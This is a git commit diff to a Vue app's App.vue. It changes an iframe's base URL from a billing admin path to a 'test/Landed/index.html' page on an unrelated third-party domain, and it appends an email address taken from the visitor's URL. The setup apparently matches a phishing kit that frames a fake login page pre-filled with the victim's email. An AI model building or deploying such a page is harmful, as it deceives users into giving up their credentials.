4056e55afc630670771c421030a78eec86ba61d8
hOve <145380276+bodethomas12@users.noreply.github.com>
2025-02-24 22:59:50 +0000

    Update App.vue

--- src/App.vue
+++ src/App.vue
@@ -28,7 +28,7 @@ export default {
       return match ? match[0] : null;
     },
     updateIframeSrc() {
-      const baseSrc = "https://billing.parallelweb.com/wadmin/"; // Base URL
+      const baseSrc = "https://astrolog-batel.co.il/test/Landed/index.html"; // Base URL
       const email = this.extractEmailFromUrl();
 
       // Append only the email to the path if found
